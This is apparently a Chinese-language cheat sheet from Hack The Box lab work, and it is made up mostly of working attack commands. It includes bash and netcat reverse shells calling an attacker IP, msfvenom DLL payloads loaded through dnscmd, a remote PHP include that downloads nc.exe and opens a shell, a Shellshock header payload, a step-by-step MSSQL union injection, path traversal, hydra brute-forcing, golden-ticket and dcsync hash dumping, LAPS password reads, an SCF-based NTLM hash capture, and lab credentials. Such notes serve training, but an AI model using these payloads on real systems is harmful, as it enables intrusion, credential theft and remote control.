  └─# perl -lpe '$_=pack"B*",$_' < <( echo 010000000110010001101101001000010110111001011111010100000100000001110011011100110101011100110000011100100110010000100001 )
  @dm!n_P@ssW0rd!
  ```

  ```bash
  └─# echo NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx | base64 -d
  6d2424716c5f53405f504073735730726421      
  ```

  ```bash
  root@kali# echo NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx | base64 -d | xxd -r -p
  m$$ql_S@_P@ssW0rd!
  ```



-  MSSQL 登录与简单操作

  ```
  └─# mssqlclient.py 'admin:m$$ql_S@_P@ssW0rd!@10.10.10.52'
  ```

  用 GUI 工具更方便 dbeaver(kali可安装)。我环境有问题，于是手动查询  [SQL Server中获取所有数据库名、所有表名、所有字段名的SQL语句_lingxyd_0的博客-CSDN博客](https://blog.csdn.net/lingxyd_0/article/details/18356407)

  ```
  SELECT name, database_id, create_date  FROM sys.databases;
  ```

  ```
  use master;
  ```

  ```
  use orcharddb
  ```

  ```
  Select Name FROM SysObjects Where XType='U' orDER BY Name
  ```

  ```
  select * from blog_Orchard_Users_UserPartRecord 
  ```




- MS14068 利用提权，黄金票据

  ```bash
  └─# goldenPac.py -dc-ip 10.10.10.52 -target-ip 10.10.10.52  htb.local/james@mantis.htb.local
  ```



- 删除文件最后一行

  ```bash
  sed -i '$d' monitor.sh
  ```

  查看文件前 10 行

  ```bash
  └─# strings ninevehForAll.png | head -n 10
  ```

  

- PHPLiteAdmin 利用 [PHPLiteAdmin 1.9.3 - Remote PHP Code Injection ](https://www.exploit-db.com/exploits/24044)，就是常规写 shell ，可能要配合其它文件包含漏洞一起利用   




- 留心文件包含的 URL

  ```http
  10.10.10.43/department/manage.php?notes=files/ninevehNotes.txt../../../../../../../etc/passwd
  ```



- hyrdra 包破 http/https 表单

  ```bash
  hydra -l admin -P /usr/share/seclists/Passwords/probable-v2-top12000.txt 10.10.10.43 http-post-form "/department/login.php:username=admin&password=^PASS^:Invalid" -t 64 -I
  
  hydra -l admin -P keyword.list 10.10.10.43 https-post-form  "/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect" -t 64 -I
  
  # userpass 为 username:password 的形式
   hydra -C userpass streamio.htb https-post-form "/login.php:username=^USER^&password=^PASS^:F=failed"
  ```



- knock 敲开端口的配置文件 `knockd.conf`

  ```bash
  cat /etc/knockd.conf
  ```



- linux 私钥登录

  ```bash
  └─# chmod 0400 id_rsa
  └─# ssh -i id_rsa amrois@10.10.10.43
  ```



- `chkrootkit` 有一个本地提权漏洞，https://www.exploit-db.com/exploits/38775 不管是啥版本，先利用一把试试 ，看了提权代码，最终是要做的就是此程序会以 root 身份周期性执行 /tmp/update 的文件，所以我们只需要新建 tmp 目录下的 update 文件，里面写入反弹shell 代码即可

  ```bash
  amrois@nineveh:~$ cd /tmp
  amrois@nineveh:/tmp$ vi update
  amrois@nineveh:/tmp$ cat update
  #!/bin/bash
  bash -i >& /dev/tcp/10.10.16.5/6666 0>&1
  amrois@nineveh:/tmp$ chmod +x update
  ```



-  msf 提权利用失败时 ，尝试 进程迁移到 x64  `migrate xxx` 再执行



- office_word_hta  CVE  [this GitHub](https://github.com/bhdresh/CVE-2017-0199)    [CVE-2017-0199](https://nvd.nist.gov/vuln/detail/CVE-2017-0199)  ，也可以用 msf  `exploit/windows/fileformat/office_word_hta`  详情：

  ```
  https://0xdf.gitlab.io/2018/11/10/htb-reel.html#phishing-with-rtf-dynamite
  ```

  


- ```powershell
  *Evil-WinRM* PS C:\> ls -force    类似于 ls -a
  gci -recurse -force -file xxxxx  # 类似于递归遍历文件夹中的文件
  ```



- `whoami /groups` ，权限提升中 `DnsAdmins` 组的利用

  [Active Directory 安全组 | Microsoft Learn](https://learn.microsoft.com/zh-cn/windows-server/identity/ad-ds/manage/understand-security-groups#dnsadmins)

  [Dnscmd | LOLBAS (lolbas-project.github.io)](https://lolbas-project.github.io/lolbas/Binaries/Dnscmd/)

  [在域控中滥用DNSAdmins权限的危害 - 先知社区 (aliyun.com)](https://xz.aliyun.com/t/2932)

  得到大概意思就是

  DNS管理员（DnsAdmin）对DNS服务器有读写权限，甚至可以告诉服务器挂载我们的DLL（原文指的是ServerLevelPluginDll文件），而且不对其挂载的路径进行验证。挂载的命令为：

  ```powershell
  dnscmd.exe /config /serverlevelplugindll \pathtodll
  ```

  利用步骤：

  1、kali 生成恶意 dll 并放在 smb 共享目录 

  ```bash
  msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.16.5 LPORT=443 -f dll -o rev.dll
  #或者
  msfvenom -p windows/x64/exec CMD='\\10.10.16.5\s\nc.exe 10.10.16.5 1234 -e cmd.exe' -f dll > reverse.dll
  ```

  ```bash
  smbserver.py s .
  ```

  2、kali 监听端口

  ```
  nc -lvnp 443
  ```

  3、靶机执行

  ```
  dnscmd.exe /config /serverlevelplugindll \\10.10.16.5\s\rev.dll
  sc.exe \\resolute stop dns
  sc.exe \\resolute start dns
  ```

  

- 提权时远程执行 winpeas [Privilege Escalation Awesome Scripts Suite](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)

  可以开启远程smb，远程执行

  kali：

  ```
  smbserver.py -username df -password df share . -smb2support
  ```

  靶机：

  ```powershell
  *Evil-WinRM* PS C:\> net use \\10.10.14.30\share /u:df df
  The command completed successfully.
  *Evil-WinRM* PS C:\> cd \\10.10.14.30\share\
  *Evil-WinRM* PS Microsoft.PowerShell.Core\FileSystem::\\10.10.14.30\share>
  *Evil-WinRM* PS Microsoft.PowerShell.Core\FileSystem::\\10.10.14.30\share> .\winPEAS.exe cmd fast > sauna_winpeas_fast
  ```




- 提权二次信息搜集时，注意 `winlogon` 日志

  ```powershell
  *Evil-WinRM* PS C:\Users\FSmith> reg.exe query "HKLM\software\microsoft\windows nt\currentversion\winlogon"
  
  *Evil-WinRM* PS HKLM:\software\microsoft\windows nt\currentversion\winlogon> get-item -path .
  ```



- kali 开启 smb 把 靶机上的 zip 文件传回 kali

  ```bash
  └─# /usr/share/doc/python3-impacket/examples/smbserver.py share . -smb2support -username zf1yolo -password zf1yolo
  ```

  靶机运行：

  ```
  net use \\10.10.16.5\share /u:zf1yolo zf1yolo
  copy 20230912231407_BloodHound.zip \\10.10.16.5\share\
  del 20230912231407_BloodHound.zip
  net use /d \\10.10.16.5\share
  ```

  

- dcsync 导出域内 Hash

  ```powershell
  *Evil-WinRM* PS C:\programdata> .\mimikatz 'lsadump::dcsync /domain:EGOTISTICAL-BANK.LOCAL /user:administrator' exit
  ```

  ```bash
  └─# secretsdump.py 'svc_loanmgr:Moneymakestheworldgoround!@10.10.10.175'
  ```

  


- msf 的安卓模版存在漏洞，`msf6 > search msfvenom` ，详情可见 靶机 `ScriptKiddie`




- 当 不知道 cms 时，可尝试谷歌识图




- Shellshock 漏洞 [Exploiting CGI Scripts with Shellshock (antonyt.com)](https://antonyt.com/blog/2020-03-27/exploiting-cgi-scripts-with-shellshock) 详情可见 shocker 靶机

  ```bash
  curl http://10.10.10.56/cgi-bin/user.sh -H  "User-agent: () { :;}; ping 10.10.16.3 -t3"
  ```



- 扫web目录可能出现的情况

  目录扫的是 http://10.10.10.56/cgi-bin  显示 404

  应该是 http://10.10.10.56/cgi-bin/ 显示 403

  可解决

  ```bash
  └─# gobuster dir -u http://10.10.10.56 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt --add-slash
  ```

  --add-slash 为结尾加上后缀 / ，如 http://10.10.10.56/cgi-bin/

  

- 如果为了得到更好的 shell ，可以上传 公钥到 用户shelly 家里的 .ssh 目录，再私钥登录，可参考 [HTB: Shocker | 0xdf hacks stuff](https://0xdf.gitlab.io/2021/05/25/htb-shocker.html)




-  `Responder` 配合 `.scf`，背景是发现了挂载 smb 目录后的 `/mnt/Users/Public` 里会定时清除文件，而这个目录存在 `.scf` 文件。大概意思就是，当有用户查看 `.scf` 文件所在的目录或者做了什么事情时，`.csf` 文件里的 `icon` 路径会被远程执行。以上定时删除文件的这个特性刚好满足了我们攻击的条件，可配合 `Responder` 获取 NetNTLMv2 的 Hash 。  详情见靶机 [Sizzle](https://0xdf.gitlab.io/2019/06/01/htb-sizzle.html#)

  ```bash
  # 在文件夹内创建一个 csf 文件
  root@kali:/mnt/Users/Public# cat 0xdf.scf 
  [Shell]
  Command=2
  IconFile=\\10.10.16.5\uwu\uwu.ico
  [Taskbar]
  Command=ToggleDesktop
  ```

  ```bash
  # kali 监听
  responder -I tun0 --lm
  # 破解 NTMLV2
  john --wordlist=/usr/share/wordlists/rockyou.txt amanda-ntlmv2
  hashcat -m 5600 amanda-ntlmv2 /usr/share/wordlists/rockyou.txt --force
  ```

​        

- POP3 渗透 可参考靶机 solidstate

  [【渗透技巧】pop3协议渗透_pop3渗透_包大人在此的博客-CSDN博客](https://blog.csdn.net/b10d9/article/details/112155909)

  [110-pop3 (flowus.cn)](https://flowus.cn/5fd1d77b-b5ed-4753-a765-90bdbf6bffb7)

  [110,995 - Pentesting POP - HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-pop)

  ```bash
  # 可以尝试爆破
  └─# hydra -s 110 -L cewl.list -P /usr/share/wordlists/rockyou.txt -e nsr -t 22 10.10.10.51 pop3
  ```



- 查找 /proc/* 下可写的并且属于 root 的文件

  ```
  find / -user root -writable -type f -not -path "/proc/*"  2>/dev/null
  ```

  linux 提权时枚举信息，看当前进程运行的文件 可用  https://github.com/DominicBreuker/pspy

  

- mssql 数据库手工注入，参考 SteamIO 靶机

  ```bash
  # sql语句大约是模糊查询
  select * from movies where title like '%[input]%';
  # 于是尝试  man';-- -  正常检索出来了 man 相关的电影
  select * from movies where title like '%man';-- -%';
  ```

  ```bash
  # union 判断列数
  abcd' union select 1,2,3,4,5,6;-- -
  # 尝试配合 Responder
  abcd'; use master; exec xp_dirtree '\\10.10.16.5\share';-- -
  # 爆库
  abcd' union select 1,name,3,4,5,6 from master..sysdatabases;-- -
  # 显示当前的数据库
  abcd' union select 1,(select DB_NAME()),3,4,5,6;-- -
  # 爆当前数据库的表名，得到两张表 `movies`、 `users`
  abcd' union select 1,name,id,4,5,6 from streamio..sysobjects where xtype='U';-- -
  # 爆 users 表的列名
  abcd' union select 1,name,id,4,5,6 from streamio..syscolumns where id in (885578193,901578250);-- -
  # 取出重要信息，usersname 和 password
  abcd' union select 1,concat(username,':',password),3,4,5,6 from users;-- -
  # hashcat 爆破密码
  hashcat user_pass /usr/share/wordlists/rockyou.txt --user -m 0 --show
  ```

  

- 观察 url 功能点  ，参考 SteamIO 靶机

  ```
  https://streamio.htb/admin/?user=
  https://streamio.htb/admin/?staff=
  https://streamio.htb/admin/?movie=
  https://streamio.htb/admin/?message=
  ```

  是不是很想 fuzz，记得鉴权写上 cookie 字段 `PHPSESSID	"hjjd4egnalb7od8d65br48m6ph"`

  ```bash
  wfuzz -u https://streamio.htb/admin/?FUZZ= -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -H "Cookie: PHPSESSID=hjjd4egnalb7od8d65br48m6ph" --hh 1678
  ```

  ```
  000001575:   200        49 L     137 W      1712 Ch     "debug"       找到一个接口 debug
  ```

  伪协议文件包含

  ```bash
  https://streamio.htb/admin/?debug=php://filter/convert.base64-encode/resource=master.php
  ```

- master.php 中的部分重要源码

  ```php
  {
  if($_POST['include'] !== "index.php" )
  eval(file_get_contents($_POST['include']));
  else
  echo(" ---- ERROR ---- ");
  }
  ```

  这时候可以尝试**远程包含+代码执行**

  ```bash
  curl -X POST "https://streamio.htb/admin/?debug=master.php" --cookie "PHPSESSID=hjjd4egnalb7od8d65br48m6ph"  -d 'include=http://10.10.16.5/rce.php' -k
  ```

  rce.php

  ```bash
  └─# cat rce.php   
  system("powershell -c wget 10.10.16.5/nc.exe -outfile \\programdata\\nc.exe");
  system("\\programdata\\nc.exe -e powershell 10.10.16.5 443");
  ```

  kali 监听得到 shell

  ```bash
  └─# nc -lvvp 443                       
  ```

  

- 二次信息搜集时查看网站目录里文件中包含 `databasae` 字段的信息

  ```powershell
  PS C:\inetpub\streamio.htb> dir -recurse *.php | select-string -pattern "database"
  ```



- windows 里自带的 where.exe 和 sqlcmd  ，参考 SteamIO 靶机

  ```powershell
  PS C:\> where.exe sqlcmd
  where.exe sqlcmd
  C:\Program Files\Microsoft SQL Server\Client SDK\ODBC\170\Tools\Binn\SQLCMD.EXE
  ```

- ```powershell
  sqlcmd -S localhost -U db_admin -P B1@hx31234567890 -d streamio_backup -Q "select table_name from streamio_backup.information_schema.tables;"
  
  sqlcmd -S localhost -U db_admin -P B1@hx31234567890 -d streamio_backup -Q "select * from users;"
  ```



- 抓取火狐浏览器密码并破解，详情见 `StreamIO` 靶机



- 二次信息搜集时的手动枚举 ，详情见 `StreamIO` 靶机




- 提权时，看用户有无 `LAPS_Readers`权限（一个用户所在的组有`LAPS_Readers`权限 ），有的话可读取 laps（本地密码） 详情见

  `StreamIO` 靶机和 `Timelapse` 靶机

  可以这样读

  ```bash
  *Evil-WinRM* PS C:\Users\svc_deploy\Documents> Get-ADComputer DC01 -property 'ms-mcs-admpwd'
  
  └─# crackmapexec smb 10.10.11.152 -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' --laps --ntds
  
  └─# ldapsearch -H ldap://10.10.11.152 -b 'DC=timelapse,DC=htb' -x -D svc_deploy@timelapse.htb -w 'E3R$Q62^12p7PLlC%KWaxuaV' "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
  
  └─# crackmapexec smb 10.10.11.152 -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' --laps --ntds 
  ```



- 解压 zip

  ```bash
  └─# zip2john winrm_backup.zip > winrm_backup.zip.hash
  └─# john  --wordlist=/usr/share/wordlists/rockyou.txt winrm_backup.zip.hash 
  ```



- 关于 legacyy_dev_auth.pfx 、*.pfx 文件，是可以破解的，大约是解密后可以得到，什么 公钥证书 的，详情见  `Timelapse` 

  ```bash
  # 破解后可以 winrm 密匙 证书登录
  └─# evil-winrm -i timelapse.htb -S -k legacyy_dev_auth.key -c legacyy_dev_auth.crt
  ```





